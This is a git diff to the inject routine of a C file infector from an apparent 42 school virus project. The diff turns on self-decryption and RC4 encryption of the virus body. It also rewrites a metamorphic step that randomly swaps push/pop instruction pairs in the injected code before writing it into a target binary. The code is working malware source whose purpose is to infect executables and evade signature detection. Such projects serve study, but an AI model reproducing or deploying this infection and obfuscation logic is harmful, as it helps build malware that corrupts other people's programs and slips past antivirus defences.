@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:20:42 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/02 00:43:42 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/02 11:33:04 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -15,7 +15,7 @@
 void		inject(t_data *data)
 {
 
-	/* revert_one(&data->key, (char*)infect, (size_t)inject - (size_t)infect); */
+	revert_one(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
 
 #ifdef DEBUG
 	char de[] = "inject\t \n";
@@ -76,38 +76,38 @@ void		inject(t_data *data)
 	if (_memcpy(dst + 1, &data->bin_entry, 4) != dst + 1)
 		goto ERR;
 
-	#define INST_NUM 8
-	uint8_t inst[INST_NUM][2] =
-	{
-		"\x50\x58",
-		"\x51\x59",
-		"\x52\x5a",
-		"\x53\x5b",
-		"\x54\x5c",
-		"\x55\x5d",
-		"\x56\x5e",
-		"\x57\x5f",
+	uint16_t inst[INST_ENTRY] =	{
+		0x5850,
+		0x5951,
+		0x5a52,
+		0x5b53,
+		0x5c54,
+		0x5d55,
+		0x5e56,
+		0x5f57
 	};
 
-	// step 5.5 : do simple meta routine
+	// step 5.5 : do simple metamorphic routine
+	lim = (size_t)_rc4 - (size_t)update_one;
 	dst = (map + off) - ((size_t)end_of_data - (size_t)update_one);
-	while (dst < map + off)
+	while (lim--)
 	{
-		for (register int i = 0 ; i < INST_NUM ; i++)
+		for (register int i = 0 ; i < INST_ENTRY ; i++)
 		{
-			if (_memcmp(inst[i], dst, 2) == 0)
+			if (*(uint16_t*)dst == inst[i])
 			{
-				_memcpy(dst, inst[_random_number(INST_NUM)], 2);
+				_memcpy(dst, &inst[_random_number(INST_ENTRY)], 2);
 				dst++;
+				break ;
 			}
 		}
 		dst++;
 	}
 
 	// step 6 : Encrypt data
-	/* dst = map + (data->virus.note->p_offset + ((size_t)opening - (size_t)start)); */
-	/* _memcpy(data->cpr_key, (uint8_t*)_rc4, KEY_SIZE); */
-	/* _rc4((uint8_t*)data->cpr_key, KEY_SIZE, dst, (size_t)_rc4 - (size_t)opening); */
+	dst = map + (data->virus.note->p_offset + ((size_t)opening - (size_t)start));
+	_memcpy(data->cpr_key, (uint8_t*)_rc4, KEY_SIZE);
+	_rc4((uint8_t*)data->cpr_key, KEY_SIZE, dst, (size_t)_rc4 - (size_t)opening);
 
 	// final : write
 	_write(data->bin.fd, map, size);
@@ -116,8 +116,8 @@ void		inject(t_data *data)
 ERR:
 	_munmap(map, size);
 
-	/* update_one(&data->key, (char*)inject, (size_t)release - (size_t)inject); */
-	/* revert_one(&data->key, (char*)release, (size_t)cypher_end  - (size_t)release); */
+	update_one(&data->key, (char*)inject, (size_t)release - (size_t)inject);
+	revert_one(&data->key, (char*)release, (size_t)cypher_end  - (size_t)release);
 
 	release(data);
 }
